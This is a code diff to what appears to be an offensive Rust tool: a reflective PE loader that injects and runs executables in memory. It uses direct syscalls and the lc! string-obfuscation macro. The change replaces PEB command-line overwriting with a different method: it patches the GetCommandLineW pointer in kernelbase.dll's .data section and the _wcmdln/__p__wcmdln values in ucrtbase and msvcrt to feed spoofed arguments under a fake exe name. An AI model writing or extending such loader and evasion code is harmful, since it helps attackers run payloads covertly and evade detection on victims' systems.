@@ -6,16 +6,17 @@ use crate::common::helpers::ascii_bytes_to_string;
 use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_HIGHLOW, IMAGE_ORDINAL_FLAG, PAGE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, THREAD_ALL_ACCESS, MEM_RELEASE};
 use crate::winapi::dll_functions::{get_dll_proc_address, get_dll_proc_address_by_ordinal_index};
 use crate::winapi::kernel32::FlushInstructionCache;
-use crate::winapi::ntdll::RtlExitUserThread;
-use crate::winapi::structs::{IMAGE_BASE_RELOCATION, IMAGE_IMPORT_BY_NAME, RTL_USER_PROCESS_PARAMETERS, UNICODE_STRING};
+use crate::winapi::ntdll::{RtlExitUserThread, RtlCreateUnicodeString};
+use crate::winapi::structs::{IMAGE_BASE_RELOCATION, IMAGE_IMPORT_BY_NAME, UNICODE_STRING};
 use crate::winapi::types::{HANDLE, BASE_RELOCATION_ENTRY, IMAGE_THUNK_DATA, PWSTR};
 #[allow(unused_imports)]
 use crate::{debug_error, debug_info, debug_info_msg, debug_success_msg, debug_ok_msg, debug_info_hex, debug_error_msg};
 #[allow(unused_imports)]
 use crate::{debug_base, debug_base_msg, debug_base_hex};
 
-use super::constants::{IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_EXPORT};
-use super::dll_functions::get_peb;
+use super::constants::{IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_EXPORT, FALSE};
+use super::dll_functions::get_dll_base_address;
+use super::kernel32::GetCommandLineW;
 use super::nt::syscall_wrapper::SyscallWrapper;
 use super::structs::{IMAGE_SECTION_HEADER, IMAGE_DATA_DIRECTORY, IMAGE_IMPORT_DESCRIPTOR};
 use super::types::PCSTR;
@@ -60,22 +61,6 @@ impl Default for PE_Infos {
 #[repr(C)]
 #[allow(non_snake_case)]
 #[allow(non_camel_case_types)]
-struct PE_Args{
-    existing_args : String,
-    existing_arg_length: u16,
-    existing_arg_max_length: u16,
-    new_args : String,
-}
-
-impl Default for PE_Args {
-    fn default() -> Self {
-        Self { existing_args: String::default(),existing_arg_length: 0, existing_arg_max_length: 0 , new_args: String::default() }
-    }
-}
-
-#[repr(C)]
-#[allow(non_snake_case)]
-#[allow(non_camel_case_types)]
 pub struct PE_Options{
     pub patch_exit_functions: bool
 }
@@ -92,7 +77,6 @@ impl Default for PE_Options {
 pub struct PE_Loader {
     infos: PE_Infos,
     pe_bytes: Vec<u8>,
-    arguments: PE_Args,
     options: PE_Options,
     ntdll: SyscallWrapper,
 }
@@ -102,7 +86,6 @@ impl PE_Loader {
         Self{
             infos: PE_Infos::default(),
             ntdll: ntdll,
-            arguments: PE_Args::default(),
             options: options,
             pe_bytes: vec![0]
         }
@@ -323,31 +306,6 @@ impl PE_Loader {
                                 debug_info_msg!(format!("Patching {} at {:#x} instead of {:#x}", function_name, function_address, before));
                             }
                         }
-
-                        //Hook command args functions
-                        // if function_name == "GetCommandLineA" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        //     (*iat_thunk_ptr).u1.Function = hook_wgetmainargs as usize;
-                        // }
-                        // else if function_name == "GetCommandLineW" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // }
-                        // else if function_name == "__getmainargs" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // }
-                        // else if function_name == "__wgetmainargs" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // }
-                        // else if function_name == "__p___argv" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // }
-                        // else if function_name == "__p___wargv" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // }
-                        // else if function_name == "hook__p___argc" {
-                        //     debug_info_msg!(format!("Found arg function {}", function_name));
-                        // } 
-                        
                     }
 
                     img_thunk_offset += size_of::<IMAGE_THUNK_DATA>();
@@ -413,132 +371,148 @@ impl PE_Loader {
         true
     }
 
-
-    //tried to overwrite the value of the PWSTR of the UNICODE_STRING => not working
-    // fn patch_arguments(&mut self) -> bool {
-    //     unsafe {
-    //         let peb = get_peb();
-    //         let peb_addr = &peb as *const _;
-    //         debug_info_msg!(format!("Found PEB at {:#x}", peb_addr as usize));
-    //         debug_info_msg!(format!("Found ProcessParameters at {:#x}", peb.ProcessParameters as usize));
-    //         let rtl_param = *(peb.ProcessParameters as *const RTL_USER_PROCESS_PARAMETERS);
-    //         let cmd_line_ptr = &rtl_param.CommandLine as *const UNICODE_STRING;
-    //         debug_info_msg!(format!("Current Parameters = {}", (*cmd_line_ptr).to_string().unwrap()));
-            
-
-
-
-    //         let cmd_line_length_ptr = (cmd_line_ptr as usize) as *mut u16;
-    //         let cmd_line_max_length_ptr = ((cmd_line_ptr as usize) + 2) as *mut u16;
-    //         let cmd_line_data_ptr_addr = ((cmd_line_ptr as usize) + 8) as *mut usize;
-            
-    //         let mut cmd_line_data_ptr = PWSTR::from_raw(*(((cmd_line_ptr as usize) + 8) as *const usize)  as *mut u16);
-
-    //         debug_info_hex!(cmd_line_data_ptr_addr as usize);
-    //         debug_info_hex!(cmd_line_data_ptr.as_ptr() as usize);
-
-    //         debug_info_msg!(format!("param length = {}", *cmd_line_length_ptr));
-    //         debug_info_msg!(format!("param max length = {}", *cmd_line_max_length_ptr));
-    //         debug_info_msg!(format!("pwstr addr = {:#x}", *(((cmd_line_ptr as usize) + 8) as *const usize) as usize));
-    //         debug_info_msg!(format!("param pwstr = {}", cmd_line_data_ptr.to_string().unwrap()));
-
-    //         //let new_pcwst = PWSTR::from_raw(self.arguments.new_args.as_mut_ptr() as *mut u16);
-    //         let mut vec: Vec<u16> = self.arguments.new_args.encode_utf16().collect();
-    //         vec.push(0);
-    //         //debug_info_hex!(*(vec.as_mut_ptr()) as usize);
-
-    //         let mut address= 0;
-    //         let mut size: usize = vec.len() * 2;
-    //         debug_info!(vec.len());
-    //         let res = self.ntdll.nt_allocate_virtual_memory(-1, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    //         if res != STATUS_SUCCESS {
-    //             crate::debug_error_msg!(format!("Failed to allocate memory (size = {})!", size));
-    //             return false;
-    //         }
-
-    //         std::ptr::copy_nonoverlapping(vec.as_ptr(), address as *mut u16, vec.len());
-
-    //         debug_info_msg!(format!("allocated address = {:#x}", address as usize));
-    //         let new_pcwst = PWSTR::from_raw(address as *mut u16);
-    //         debug_info_msg!(format!("allocated pwstr = {}", new_pcwst.to_string().unwrap()));
-
-    //         *(cmd_line_data_ptr_addr) = address;
-    //         *(cmd_line_length_ptr) = (vec.len() * 2) as u16;
-    //         *(cmd_line_max_length_ptr) = (vec.len() * 2) as u16;
-
-
-    //         debug_info_msg!(format!("param length = {}", *cmd_line_length_ptr));
-    //         debug_info_msg!(format!("param max length = {}", *cmd_line_max_length_ptr));
-    //         debug_info_msg!(format!("pwstr addr = {:#x}", *(((cmd_line_ptr as usize) + 8) as *const usize) as usize));
-    //         cmd_line_data_ptr = PWSTR::from_raw(*(((cmd_line_ptr as usize) + 8) as *const usize)  as *mut u16);
-    //         debug_info_msg!(format!("param pwstr = {}", cmd_line_data_ptr.to_string().unwrap()));
-    //         debug_info_msg!(format!("New Parameters = {}", (*cmd_line_ptr).to_string().unwrap()));
-    //     }
-        
-
-    //     //same
-    //     // unsafe {
-    //     //     let parm_addr = (peb_addr as usize + 32) as *const usize;
-    //     //     debug_info_msg!(format!("Found ProcessParameters at {:#x} ",*(parm_addr)));
-    //     // }
-    //     // debug_info_msg!(format!("Found PEB ProcessParameters address at {:#x}", peb_addr as usize + 32));
-
-
-    //     true
-    // }
-
     fn patch_arguments(&mut self, args: String) -> bool {
-        let (existing_args_length, existing_args_max_length, existing_args) = self.read_args();
-
+        //create the new unicode_string containing the new args
+        let fake_exe_name = lc!("mefl.exe");//could be anything
         let mut full_cmd = String::new();
-        full_cmd.push_str(" "); //should start with a space because the firs param should be the exe name. if we put just a space, exe name is empty
+        full_cmd.push_str(&fake_exe_name);
+        full_cmd.push(' ');
         full_cmd.push_str(&args.trim());
-        let full_cmd_length = (full_cmd.len() * 2 + 2) as u16;
+        
+        let mut vec: Vec<u16> = full_cmd.encode_utf16().collect();
+        vec.push(0);
+        let cmd_line_pwstr = PWSTR::from_raw(vec.as_mut_ptr());
 
-        if full_cmd_length > existing_args_max_length {
-            crate::debug_error_msg!(format!("Too long parameter string for the current peb (length of {}, authorized : {})",full_cmd_length, existing_args_max_length));
+        let mut new_args_us = UNICODE_STRING {Buffer: PWSTR::from_raw(null_mut()), MaximumLength :0, Length:0};
+        let new_args_us_pointer = &mut new_args_us as *mut UNICODE_STRING;
+        //debug_info_hex!(new_args_us_pointer as usize);
+        unsafe {
+            if RtlCreateUnicodeString(new_args_us_pointer, cmd_line_pwstr) == FALSE {
+                debug_error_msg!("Failed to create new arguments Unicode_string!");
                 return false;
+            }
         }
 
-        //saving existing args and new arg
-        self.arguments.new_args = args;
-        self.arguments.existing_args = existing_args;
-        self.arguments.existing_arg_length = existing_args_length;
-        self.arguments.existing_arg_max_length = existing_args_max_length;
+        //hijack command line
+        let mut pointers_count = 0;
+        let mut data_section_ptr = 0;
 
+        unsafe {
+            let kernel_base_handle = get_dll_base_address("kernelbase.dll");
 
-        self.overwrite_peb_args(full_cmd_length, full_cmd_length, full_cmd);
+            let dos_headers_ptr = kernel_base_handle as *const IMAGE_DOS_HEADER;
+            let nt_headers_ptr = (kernel_base_handle as usize + (*dos_headers_ptr).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
+            let mut img_section_hdr_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;
+                for _ in 0..(*self.infos.nt_header_ptr).FileHeader.NumberOfSections {
+                    //debug_ok_msg!(format!("section {} ", ascii_bytes_to_string(&(*img_section_hdr_ptr).Name)));
+                    if ascii_bytes_to_string(&(*img_section_hdr_ptr).Name) == lc!(".data") {
+                        pointers_count = (*img_section_hdr_ptr).Misc.VirtualSize as usize / size_of::<usize>();
+                        data_section_ptr = (kernel_base_handle as usize + (*img_section_hdr_ptr).VirtualAddress as usize) as usize;
+                        break;
+                    }
+
+                    img_section_hdr_ptr = (img_section_hdr_ptr as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const IMAGE_SECTION_HEADER;
+                }
+
+            let get_command_line_w_pwstr = GetCommandLineW();
+            
+        
+            //patch GetCommandLineW
+            for _ in 0..pointers_count {
+                let current_pointer = data_section_ptr as *mut UNICODE_STRING;
+                data_section_ptr = data_section_ptr + size_of::<usize>();
+
+                if (*current_pointer).Buffer.as_ptr() as usize != get_command_line_w_pwstr.as_ptr() as usize {
+                    continue;
+                }
+                debug_ok_msg!(format!("patching GetCommandLineW at {:#x} (Buffer = {:#x})", current_pointer as usize, (*current_pointer).Buffer.as_ptr() as usize));
+                *current_pointer = *new_args_us_pointer;
+                #[cfg(feature = "verbose")]
+                debug_ok_msg!(format!("New value for GetCommandLineW = {}", GetCommandLineW().to_string().unwrap()));
+                debug_ok_msg!(format!("patced GetCommandLineW at {:#x} (Buffer = {:#x})", current_pointer as usize, (*current_pointer).Buffer.as_ptr() as usize));
+                break;
+            }
+
+            //should patch GetCommandLineA
+
+            //_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv
+            type WCHAR = u16;
+            type PWCHAR = *mut WCHAR;
+            type PPWCHAR = *mut PWCHAR;
+
+            let mut address = get_dll_proc_address("ucrtbase.dll", "__p__wcmdln");
+            if address != 0 {
+                debug_ok_msg!(format!("Patching {}!{} at {:#x}", "ucrtbase.dll", "__p__wcmdln", address));
+                let p_wcmdln: unsafe extern "system" fn() -> usize = core::mem::transmute(address);
+                let wargv = p_wcmdln() as PPWCHAR;
+                *wargv = (*new_args_us_pointer).Buffer.as_ptr();
+            }
+
+            address = get_dll_proc_address("msvcrt.dll", "_wcmdln");
+            if address != 0 {
+                debug_ok_msg!(format!("Patching {}!{} at {:#x}", "msvcrt.dll", "_wcmdln", address));
+                let wargv = address as PPWCHAR;
+                *wargv = (*new_args_us_pointer).Buffer.as_ptr();
+            }
+
+            // unsafe {
+            //     let peb = get_peb();
+            //     let mut p_ldr_data_table_entry: *const LDR_DATA_TABLE_ENTRY = (*peb.Ldr).InMemoryOrderModuleList.Flink as *const LDR_DATA_TABLE_ENTRY;
+            //     let mut p_list_entry = &(*peb.Ldr).InMemoryOrderModuleList as *const LIST_ENTRY;
+
+            //     loop {
+            //         let mut dll_name = (*p_ldr_data_table_entry).FullDllName.to_string().unwrap();
+                    
+            //         //last element of the list => shoudl stop the loop
+            //         if p_list_entry == (*peb.Ldr).InMemoryOrderModuleList.Blink {
+            //             break
+            //         }
+
+            //         let dll_handle = get_dll_base_address(&dll_name);
+                    
+                    
+            //         //_wcmdln
+            //         // debug_ok_msg!(format!("Loking into dll : {} at {:#x}", dll_name, dll_handle as usize));
+            //         // let mut address = GetProcAddress(dll_handle, PCSTR::from_raw("_wcmdln".to_ascii_lowercase().as_ptr()));
+            //         // if address != 0 {
+            //         //     debug_ok_msg!(format!("Found {}.{} at {:#x}", dll_name, "_wcmdln", address));
+            //         // }
+            //         // address = GetProcAddress(dll_handle, PCSTR::from_raw("__wargv".to_ascii_lowercase().as_ptr()));
+            //         // if address != 0 {
+            //         //     debug_ok_msg!(format!("Found {}.{} at {:#x}", dll_name, "__wargv", address));
+            //         // }
+            //         // address = GetProcAddress(dll_handle, PCSTR::from_raw("__p__wcmdln".to_ascii_lowercase().as_ptr()));
+            //         // if address != 0 {
+            //         //     debug_ok_msg!(format!("Found {}.{} at {:#x}", dll_name, "__p__wcmdln", address));
+            //         // }
+            //         // address = GetProcAddress(dll_handle, PCSTR::from_raw("__p___wargv".to_ascii_lowercase().as_ptr()));
+            //         // if address != 0 {
+            //         //     debug_ok_msg!(format!("Found {}.{} at {:#x}", dll_name, "__p___wargv", address));
+            //         // }
+
+            //         //go to next element of the list
+            //         p_list_entry = (*p_list_entry).Flink;
+            //         p_ldr_data_table_entry = (*p_list_entry).Flink as *const LDR_DATA_TABLE_ENTRY;
+            //     }
+            // }
+        }
+
         true
     }
 
-    fn overwrite_peb_args(&self, length: u16, max_length: u16, args: String) {
-        unsafe {
-            let peb = get_peb();
-            let rtl_param = *(peb.ProcessParameters as *const RTL_USER_PROCESS_PARAMETERS);
-            let cmd_line_ptr = &rtl_param.CommandLine as *const UNICODE_STRING;
-            let cmd_line_length_ptr = (cmd_line_ptr as usize) as *mut u16;
-            let cmd_line_max_length_ptr = ((cmd_line_ptr as usize) + 2) as *mut u16;
-            let cmd_line_data_ptr = PWSTR::from_raw(*(((cmd_line_ptr as usize) + 8) as *const usize)  as *mut u16);
+    // fn read_peb_args(&self) -> (u16, u16, String) {
+    //     unsafe {
+    //         let peb = get_peb();
+    //         let rtl_param = *(peb.ProcessParameters as *const RTL_USER_PROCESS_PARAMETERS);
+    //         let cmd_line_ptr = &rtl_param.CommandLine as *const UNICODE_STRING;
+    //         let cmd_line_length_ptr = (cmd_line_ptr as usize) as *mut u16;
+    //         let cmd_line_max_length_ptr = ((cmd_line_ptr as usize) + 2) as *mut u16;
 
-            let mut vec: Vec<u16> = args.encode_utf16().collect();
-            vec.push(0);
+    //         debug_ok_msg!(format!("Currrent PEB args : buffer at {:#x}, maxl = {}, length = {}, value = {}", (*cmd_line_ptr).Buffer.as_ptr() as usize, (*cmd_line_ptr).MaximumLength, (*cmd_line_ptr).Length, (*cmd_line_ptr).Buffer.to_string().unwrap()));
 
-            *(cmd_line_length_ptr) = length;
-            *(cmd_line_max_length_ptr) = max_length;
-            std::ptr::copy_nonoverlapping(vec.as_ptr(), cmd_line_data_ptr.as_ptr() as *mut u16, vec.len());
-        }
-    }
-
-    fn read_args(&self) -> (u16, u16, String) {
-        unsafe {
-            let peb = get_peb();
-            let rtl_param = *(peb.ProcessParameters as *const RTL_USER_PROCESS_PARAMETERS);
-            let cmd_line_ptr = &rtl_param.CommandLine as *const UNICODE_STRING;
-            let cmd_line_length_ptr = (cmd_line_ptr as usize) as *mut u16;
-            let cmd_line_max_length_ptr = ((cmd_line_ptr as usize) + 2) as *mut u16;
-            (*(cmd_line_length_ptr),*(cmd_line_max_length_ptr),(*cmd_line_ptr).to_string().unwrap())
-        }
-    }
+    //         (*(cmd_line_length_ptr),*(cmd_line_max_length_ptr),(*cmd_line_ptr).to_string().unwrap())
+    //     }
+    // }
 
     pub fn inject(&mut self, pe_bytes: Vec<u8>) -> bool {
         if !self.init(pe_bytes) {
@@ -632,10 +606,6 @@ impl PE_Loader {
             crate::debug_error_msg!(format!("Failed to free memory : {:#x}!", res as usize));
             return false;
         }
-
-        #[cfg(feature = "verbose")]
-        debug_info_msg!(format!("restoring args"));
-        self.overwrite_peb_args(self.arguments.existing_arg_length, self.arguments.existing_arg_max_length, self.arguments.existing_args.clone());
 
         debug_success_msg!(format!("Done."));
         true
